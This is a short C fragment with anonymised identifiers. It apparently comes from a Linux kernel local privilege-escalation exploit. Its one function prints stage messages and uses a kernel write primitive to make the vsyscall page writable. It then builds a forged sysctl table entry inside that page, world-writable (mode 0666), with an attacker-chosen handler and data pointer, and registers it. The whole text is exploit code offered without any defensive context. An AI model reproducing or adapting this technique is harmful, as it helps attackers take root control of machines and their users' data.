
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct ctl_table {char* procname; int mode; int maxlen; void* extra2; void* extra1; void* data; void* proc_handler; } ;


 scalar_t__ VAR_0 ;
 scalar_t__ VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 scalar_t__ VAR_5 ;
 int FUNC_0 (char*) ;
 int FUNC_1 (int ,scalar_t__,int ) ;
 int FUNC_2 (char*,char*,int) ;
 int FUNC_3 (char*,char,int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (char*,int ) ;
 int VAR_6 ;
 int VAR_7 ;

void FUNC_6(void)
{
    struct ctl_table *VAR_8;

    FUNC_0("[.] making vsyscall page writable...\n\n");

    FUNC_1(VAR_3, VAR_5, VAR_6);

    FUNC_0("[~] done, stage 1 completed\n");

    FUNC_4(5);

    FUNC_0("[.] registering new sysctl...\n\n");

    VAR_8 = (struct ctl_table *)(VAR_5+0x850);

    FUNC_3((char *)(VAR_5+0x850), '\x00', 1952);

    FUNC_5((char *)(VAR_5+0xf00), VAR_4);
    FUNC_2((char *)(VAR_5+0xe00), "\x01\x00\x00\x00",4);
    VAR_8->procname = (char *)(VAR_5+0xf00);
    VAR_8->mode = 0666;
    VAR_8->proc_handler = (void *)(VAR_1);
    VAR_8->data = (void *)(VAR_0);
    VAR_8->maxlen = 256;
    VAR_8->extra1 = (void *)(VAR_5+0xe00);
    VAR_8->extra2 = (void *)(VAR_5+0xd00);

    FUNC_1(VAR_2, VAR_5+0x850, VAR_7);

    FUNC_0("[~] done, stage 2 completed\n");
}
